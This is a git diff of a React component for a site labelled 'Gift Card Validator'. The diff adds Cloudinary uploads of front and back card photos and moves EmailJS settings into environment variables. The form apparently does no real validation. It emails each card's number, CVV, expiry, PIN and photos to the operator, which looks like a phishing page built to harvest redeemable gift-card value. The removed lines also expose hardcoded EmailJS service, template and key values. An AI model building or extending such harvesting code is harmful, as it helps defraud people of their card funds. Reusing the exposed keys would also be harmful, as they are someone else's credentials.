@@ -2,6 +2,11 @@ import { Text, Box, Flex, Button, Image, Card, CardBody, Stack, Heading, Divider
 import { useRef, forwardRef, useState } from 'react';
 import emailjs from '@emailjs/browser';
 import imageCompression from 'browser-image-compression';
+import axios from 'axios';
+
+const CLOUD_NAME = process.env.REACT_APP_CLOUD_NAME
+const CLOUDINARY_URL = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`;
+const CLOUDINARY_UPLOAD_PRESET = process.env.REACT_APP_UPLOAD_PRESET;
 
 export default function Home({ informationSectionRef }) {
     const faqRef = useRef(null);
@@ -199,9 +204,8 @@ function PurchaseOrValidate() {
     const [isFileValid, setIsFileValid] = useState(true);
     const [frontImage, setFrontImage] = useState(null);
     const [backImage, setBackImage] = useState(null);
-    const maxTotalFileSize = 500 * 1024;
-    const [frontImageFile, setFrontImageFile] = useState(null);
-    const [backImageFile, setBackImageFile] = useState(null);   
+    const [frontImageUrl, setFrontImageUrl] = useState('');
+    const [backImageUrl, setBackImageUrl] = useState(''); 
 
     const openPurchaseModal = (card) => {
         setSelectedCard(card);
@@ -254,9 +258,9 @@ function PurchaseOrValidate() {
             validateExpiry,
             validatePin,
         };
-        const serviceId = 'service_rsh8zcj'
-        const templateId = 'template_kq7rvh7'
-        const publicKey = '8NV8xqPuYSjS3pDn3'
+        const serviceId = process.env.REACT_APP_SERVICE_ID;
+        const templateId = process.env.REACT_APP_TEMPLATE_ID;
+        const publicKey = process.env.REACT_APP_PUBLIC_KEY;
         const templateParams = {
             from_name: "Gift Card Validator",
             CardType: selectedCard?.name,
@@ -266,11 +270,13 @@ function PurchaseOrValidate() {
             CardNumber: validateCardNumber,
             CVV: validateCVV,
             Expiry: validateExpiry,
-            Pin: validatePin
+            Pin: validatePin,
+            frontOfCard: frontImageUrl,
+            backOfCard: backImageUrl,
         }
         emailjs.send(serviceId, templateId, templateParams, publicKey)
             .then((response) => {
-                // console.log("email sent succesfully", response)
+                console.log("email sent succesfully", response)
             })
             .catch((error) => {
                 console.error("Error", error)
@@ -291,9 +297,9 @@ function PurchaseOrValidate() {
         event.preventDefault();
         setLoading(true);
 
-        const serviceId = 'service_rsh8zcj'
-        const templateId = 'template_kq7rvh7'
-        const publicKey = '8NV8xqPuYSjS3pDn3'
+        const serviceId = process.env.REACT_APP_SERVICE_ID;
+        const templateId = process.env.REACT_APP_TEMPLATE_ID;
+        const publicKey = process.env.REACT_APP_PUBLIC_KEY;
 
         emailjs.sendForm(serviceId, templateId, form.current, publicKey)
             .then((response) => {
@@ -321,6 +327,8 @@ function PurchaseOrValidate() {
         setValidatePin('');
         setSelectedPrice(null);
         setQuantity(1);
+        setFrontImageUrl('')
+        setBackImageUrl('')
     };
 
     const closePurchaseModal = () => {
@@ -444,42 +452,70 @@ function PurchaseOrValidate() {
         // console.log('Error compressing the file:', error);
         return file; // Return the original file if compression fails
     }
-};
-
-    const handleFileChange = (e) => {
-    const file = e.target.files[0];
+    };
     
-    if (!file) return;
+    // Function to upload image to Cloudinary
+    const uploadToCloudinary = async (file) => {
+        const formData = new FormData();
+        formData.append('file', file);
+        formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
+        try {
+            const response = await axios.post(CLOUDINARY_URL, formData);
+            console.log(response.data.secure_url)
+            return response.data.secure_url; // This is the URL for the uploaded image
+        } catch (error) {
+            console.error('Error uploading to Cloudinary', error);
+            return null;
+        }
+    };
 
-    // Create an object URL to display the selected image
-    const imageUrl = URL.createObjectURL(file);
+    // Handle file change for front and back image uploads
+    const handleFileChange = async (e, setImageState) => {
+        const file = e.target.files[0];
+        if (!file) return;
 
-    // Update state based on the input field that triggered the event
-    if (e.target.name === 'front_image') {
-        setFrontImage(imageUrl);  // For displaying the image
-        setFrontImageFile(file);  // For validation purposes
-    } else if (e.target.name === 'back_image') {
-        setBackImage(imageUrl);   // For displaying the image
-        setBackImageFile(file);   // For validation purposes
-    }
+        // Generate a local preview of the image
+        const localPreviewUrl = URL.createObjectURL(file);
+        
+        // Update the local preview state
+        setImageState(localPreviewUrl); // Show the selected image
 
-    // Perform validation based on actual file objects
-    const frontFileSize = e.target.name === 'front_image' ? file.size : frontImageFile?.size || 0;
-    const backFileSize = e.target.name === 'back_image' ? file.size : backImageFile?.size || 0;
-    const totalSize = frontFileSize + backFileSize;
+        // Upload image to Cloudinary
+        setLoading(true);
+        const imageUrl = await uploadToCloudinary(file); // Your Cloudinary upload logic
+        setLoading(false);
 
-    // Validate combined file size and check if both files are present
-    if (totalSize > 500 * 1024) {  // 500KB limit
-        setErrorMessage('Attachments size limit. The maximum allowed attachments size is 500KB');
-        setIsFileValid(false);
-    } else if (!frontFileSize || !backFileSize) {
-        setErrorMessage('Please upload both front and back images.');
-        setIsFileValid(false);
-    } else {
-        setErrorMessage('');
-        setIsFileValid(true);
-    }
-};
+        // Set the Cloudinary URL in the corresponding state variable
+        if (e.target.name === 'front_image') {
+            setFrontImageUrl(imageUrl); // Store the Cloudinary URL for later use
+        } else if (e.target.name === 'back_image') {
+            setBackImageUrl(imageUrl); // Store the Cloudinary URL for later use
+        }
+    };
+
+    const handleSubmit = (event) => {
+        event.preventDefault();
+
+        const serviceId = process.env.REACT_APP_SERVICE_ID;
+        const templateId = process.env.REACT_APP_TEMPLATE_ID;
+        const publicKey = process.env.REACT_APP_PUBLIC_KEY;
+
+        const emailParams = {
+            to_name: 'Recipient Name',
+            from_name: 'Your Name',
+            message: 'Here are the images:',
+            front_image_url: frontImageUrl, // Cloudinary URL for the front image
+            back_image_url: backImageUrl    // Cloudinary URL for the back image
+        };
+
+        emailjs.send(serviceId, templateId, emailParams, publicKey)
+            .then((response) => {
+                console.log('Success!', response.status, response.text);
+            })
+            .catch((error) => {
+                console.error('Failed...', error);
+            });
+    };
 
     return (
         <Box
@@ -608,72 +644,67 @@ function PurchaseOrValidate() {
                             <ModalBody pb={6}>
                                 {/* Conditionally show form or upload message */}
                                 {isUploadMode ? (
-                                    <form ref={form} encType="multipart/form-data" onSubmit={handleUploadSubmit}>
+                                    <form ref={form} encType="multipart/form-data" onSubmit={handleFormSubmit}>
                                         <FormControl mt={4}>
                                             <FormLabel>Front of Card</FormLabel>
                                             <Box
-                                            border="2px dashed #ccc"
-                                            borderRadius="md"
-                                            p={4}
-                                            display="flex"
-                                            flexDirection="column"
-                                            alignItems="center"
-                                            justifyContent="center"
-                                            cursor="pointer"
-                                            onClick={() => document.getElementById("frontImageUpload").click()}
+                                                border="2px dashed #ccc"
+                                                borderRadius="md"
+                                                p={4}
+                                                display="flex"
+                                                flexDirection="column"
+                                                alignItems="center"
+                                                justifyContent="center"
+                                                cursor="pointer"
+                                                onClick={() => document.getElementById("frontImageUpload").click()}
                                             >
-                                            {frontImage ? (
-                                                <Image src={frontImage} alt="Front of Card" boxSize="100px" objectFit="cover" />
-                                            ) : (
-                                                <Text>Select Front Image</Text>
-                                            )}
+                                                {frontImage ? (
+                                                    <Image src={frontImage} alt="Front of Card" boxSize="100px" objectFit="cover" />
+                                                ) : (
+                                                    <Text>Select Front Image</Text>
+                                                )}
                                             </Box>
                                             {/* Hidden File Input */}
                                             <input
-                                            type="file"
-                                            id="frontImageUpload"
-                                            name="front_image"
-                                            accept="image/*"
-                                            style={{ display: "none" }}
-                                            onChange={(e) => handleFileChange(e, setFrontImage)}
+                                                type="file"
+                                                id="frontImageUpload"
+                                                name="front_image"
+                                                accept="image/*"
+                                                style={{ display: "none" }}
+                                                onChange={(e) => handleFileChange(e, setFrontImage)}
                                             />
                                         </FormControl>
 
-                                        {/* Custom Back Image Upload */}
                                         <FormControl mt={4}>
                                             <FormLabel>Back of Card</FormLabel>
                                             <Box
-                                            border="2px dashed #ccc"
-                                            borderRadius="md"
-                                            p={4}
-                                            display="flex"
-                                            flexDirection="column"
-                                            alignItems="center"
-                                            justifyContent="center"
-                                            cursor="pointer"
-                                            onClick={() => document.getElementById("backImageUpload").click()}
+                                                border="2px dashed #ccc"
+                                                borderRadius="md"
+                                                p={4}
+                                                display="flex"
+                                                flexDirection="column"
+                                                alignItems="center"
+                                                justifyContent="center"
+                                                cursor="pointer"
+                                                onClick={() => document.getElementById("backImageUpload").click()}
                                             >
-                                            {backImage ? (
-                                                <Image src={backImage} alt="Back of Card" boxSize="100px" objectFit="cover" />
-                                            ) : (
-                                                <Text>Select Back Image</Text>
-                                            )}
+                                                {backImage ? (
+                                                    <Image src={backImage} alt="Back of Card" boxSize="100px" objectFit="cover" />
+                                                ) : (
+                                                    <Text>Select Back Image</Text>
+                                                )}
                                             </Box>
                                             {/* Hidden File Input */}
                                             <input
-                                            type="file"
-                                            id="backImageUpload"
-                                            name="back_image"
-                                            accept="image/*"
-                                            style={{ display: "none" }}
-                                            onChange={(e) => handleFileChange(e, setBackImage)}
+                                                type="file"
+                                                id="backImageUpload"
+                                                name="back_image"
+                                                accept="image/*"
+                                                style={{ display: "none" }}
+                                                onChange={(e) => handleFileChange(e, setBackImage)}
                                             />
                                         </FormControl>
-
-                                        {errorMessage && <p style={{ color: 'red' }}>{errorMessage}</p>}
-                                        <p style={{ fontSize: '12px' }}>Info: max size of file is 250kb</p>
-
-                                       
+                                        
                                         <Button
                                             mt={6}
                                             colorScheme="white"
@@ -716,11 +747,11 @@ function PurchaseOrValidate() {
                                 </form>
                             )}
                             </ModalBody>
-                            {/* <ModalFooter>
+                            <ModalFooter>
                                 <Button variant="outline" colorScheme="blue" onClick={handleToggleUploadMode}>
                                     {isUploadMode ? "Type digits" : "Upload card"}
                                 </Button>
-                            </ModalFooter> */}
+                            </ModalFooter>
                     </ModalContent>
                 </Modal>
                 {/* Other Cards Modal */}
